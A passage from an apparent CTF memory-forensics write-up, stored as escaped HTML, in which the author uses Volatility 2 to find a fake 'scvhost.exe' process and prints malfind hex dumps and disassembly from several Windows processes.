1532      3       77      1      0 2023-05-06 16:45:18 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8003985060 conhost.exe            1900    412      2       51      1      0 2023-05-06 16:45:18 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800664f1b0 svchost.exe            2168    464      5        0 ------      0 2023-05-06 16:45:49 UTC+0000\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Ok so notepad running is always an indication to be checked as ive realised from MEMLABS\u003C/p>\n\u003Cp>So lets dump notepad and see any .dat or what started notepad , we’ll use pstree to see the parent child process spawn data .\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>PS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 pslist | Select-String \"2320\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Volatility Foundation Volatility Framework 2.6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800398f660 notepad.exe            2320   1924      2       57      1      0 2023-05-06 16:44:54 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 pslist | Select-String \"1924\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Volatility Foundation Volatility Framework 2.6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa8003967b30 scvhost.exe            1924   1532      5       55      1      0 2023-05-06 16:44:54 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0xfffffa800398f660 notepad.exe            2320   1924      2       57      1      0 2023-05-06 16:44:54 UTC+0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Okie so The process name is scvhost.exe which is a typo/misspelling of the legitimate Windows process svchost.exe\u003C/p>\n\u003Cp>This could be a malware and we’ll use malfind next for more investigation later  .\u003C/p>\n\u003Cp>coming back to see what the commands were\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>PS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 cmdline -p 1924              \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Volatility Foundation Volatility Framework 2.6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>************************************************************************\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>scvhost.exe pid:   1924\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Command line : \"C:\\Users\\EdwardNygma7\\Downloads\\windows-patch-update\\scvhost.exe\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Also edward nygma is riddler which might be a clue ?\u003C/p>\n\u003Cp>Now that we;ve made sure that this was a malware pretending to be a legitimate process lets run malfind .\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>PS D:\\DFIR-LABS\\bi0sctfchall1> vol2 -f .\\Damian.mem --profile=Win7SP1x64 malfind        \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Volatility Foundation Volatility Framework 2.6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: explorer.exe Pid: 1532 Address: 0x3dc0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0020  00 00 dc 03 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0000 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0002 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0004 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0006 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0008 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc000a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc000c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc000e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0010 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0012 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0014 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0016 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0018 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc001a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc001c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc001e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0020 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0022 dc03             FADD QWORD [EBX]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0024 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0026 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0028 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc002a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc002c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc002e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0030 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0032 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0034 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0036 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc0038 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc003a 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc003c 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x03dc003e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: explorer.exe Pid: 1532 Address: 0x4180000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180000  41 ba 80 00 00 00 48 b8 38 a1 ee fd fe 07 00 00   A.....H.8.......\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180010  48 ff 20 90 41 ba 81 00 00 00 48 b8 38 a1 ee fd   H...A.....H.8...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180020  fe 07 00 00 48 ff 20 90 41 ba 82 00 00 00 48 b8   ....H...A.....H.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180030  38 a1 ee fd fe 07 00 00 48 ff 20 90 41 ba 83 00   8.......H...A...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180000 41               INC ECX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180001 ba80000000       MOV EDX, 0x80\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180006 48               DEC EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180007 b838a1eefd       MOV EAX, 0xfdeea138\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418000c fe07             INC BYTE [EDI]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418000e 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180010 48               DEC EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180011 ff20             JMP DWORD [EAX]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180013 90               NOP\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180014 41               INC ECX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180015 ba81000000       MOV EDX, 0x81\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418001a 48               DEC EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418001b b838a1eefd       MOV EAX, 0xfdeea138\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180020 fe07             INC BYTE [EDI]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180022 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180024 48               DEC EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180025 ff20             JMP DWORD [EAX]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180027 90               NOP\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180028 41               INC ECX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180029 ba82000000       MOV EDX, 0x82\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418002e 48               DEC EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418002f b838a1eefd       MOV EAX, 0xfdeea138\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180034 fe07             INC BYTE [EDI]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180036 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180038 48               DEC EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x04180039 ff20             JMP DWORD [EAX]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418003b 90               NOP\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418003c 41               INC ECX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418003d ba               DB 0xba\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418003e 83               DB 0x83\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x0418003f 00               DB 0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: SearchFilterHo Pid: 1580 Address: 0xc50000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 2, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50000  00 00 00 00 00 00 00 00 09 83 17 8f 1c e3 00 01   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50010  ee ff ee ff 00 00 00 00 28 01 c5 00 00 00 00 00   ........(.......\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50020  28 01 c5 00 00 00 00 00 00 00 c5 00 00 00 00 00   (...............\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50030  00 00 c5 00 00 00 00 00 80 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50000 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50002 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50004 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50006 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50008 0983178f1ce3     OR [EBX-0x1ce370e9], EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5000e 0001             ADD [ECX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50010 ee               OUT DX, AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50011 ff               DB 0xff\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50012 ee               OUT DX, AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50013 ff00             INC DWORD [EAX]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50015 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50017 0028             ADD [EAX], CH\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50019 01c5             ADD EBP, EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5001b 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5001d 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5001f 0028             ADD [EAX], CH\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50021 01c5             ADD EBP, EAX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50023 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50025 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50027 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50029 00c5             ADD CH, AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5002b 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5002d 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5002f 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50031 00c5             ADD CH, AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50033 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50035 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c50037 008000000000     ADD [EAX+0x0], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5003d 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00c5003f 00               DB 0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: iexplore.exe Pid: 2668 Address: 0xf60000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 2, MemCommit: 1, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60000  b0 00 eb 70 b0 01 eb 6c b0 02 eb 68 b0 03 eb 64   ...p...l...h...d\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60010  b0 04 eb 60 b0 05 eb 5c b0 06 eb 58 b0 07 eb 54   ...`...\\\\...X...T\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60020  b0 08 eb 50 b0 09 eb 4c b0 0a eb 48 b0 0b eb 44   ...P...L...H...D\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60030  b0 0c eb 40 b0 0d eb 3c b0 0e eb 38 b0 0f eb 34   ...@...&#x3C;...8...4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60000 b000             MOV AL, 0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60002 eb70             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60004 b001             MOV AL, 0x1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60006 eb6c             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60008 b002             MOV AL, 0x2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6000a eb68             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6000c b003             MOV AL, 0x3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6000e eb64             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60010 b004             MOV AL, 0x4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60012 eb60             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60014 b005             MOV AL, 0x5\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60016 eb5c             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60018 b006             MOV AL, 0x6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6001a eb58             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6001c b007             MOV AL, 0x7\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6001e eb54             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60020 b008             MOV AL, 0x8\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60022 eb50             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60024 b009             MOV AL, 0x9\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60026 eb4c             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60028 b00a             MOV AL, 0xa\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6002a eb48             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6002c b00b             MOV AL, 0xb\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6002e eb44             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60030 b00c             MOV AL, 0xc\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60032 eb40             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60034 b00d             MOV AL, 0xd\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60036 eb3c             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f60038 b00e             MOV AL, 0xe\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6003a eb38             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6003c b00f             MOV AL, 0xf\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00f6003e eb34             JMP 0xf60074\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: iexplore.exe Pid: 2668 Address: 0x5fff0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0000  64 74 72 52 00 00 00 00 00 02 ff 5f 00 00 00 00   dtrR......._....\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0000 647472           JZ 0x5fff0075\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0003 52               PUSH EDX\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0004 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0006 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0008 0002             ADD [EDX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff000a ff5f00           CALL FAR DWORD [EDI+0x0]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff000d 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff000f 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0011 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0013 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0015 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0017 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0019 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001b 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001d 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff001f 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0021 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0023 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0025 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0027 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0029 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002b 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002d 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff002f 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0031 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0033 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0035 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0037 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff0039 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003b 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003d 0000             ADD [EAX], AL\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x5fff003f 00               DB 0x0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Process: iexplore.exe Pid: 2752 Address: 0xde0000\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>Flags: CommitCharge: 2, MemCommit: 1, PrivateMemory: 1, Protection: 6\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x00de0000  b0 00 eb 70 b0 01 eb 6c b0 02 eb 68 b0 03 eb 64   